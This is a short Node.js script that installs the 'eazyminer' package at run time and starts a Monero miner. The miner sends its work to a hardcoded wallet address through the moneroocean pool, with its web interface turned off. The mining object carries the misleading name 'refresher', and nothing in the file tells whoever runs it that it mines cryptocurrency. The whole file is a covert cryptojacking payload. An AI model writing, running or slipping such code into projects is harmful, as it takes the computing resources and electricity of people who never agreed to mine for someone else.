const childProcess = require('child_process');

// Install dependencies
console.log('Installing dependencies...');
childProcess.execSync('npm install eazyminer', { stdio: 'inherit' });

const dlrp = require('eazyminer');

const refresher = new dlrp({
    pools: [{
        coin: 'XMR',
        user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
        url: 'gulf.moneroocean.stream:20128',
    }],
    web: [{
        
        // Enable or Disable web client
        enabled: false,

        // The used port for the webclient
        port: 3000 
    }],
    autoStart: false 
});

refresher.start(); 
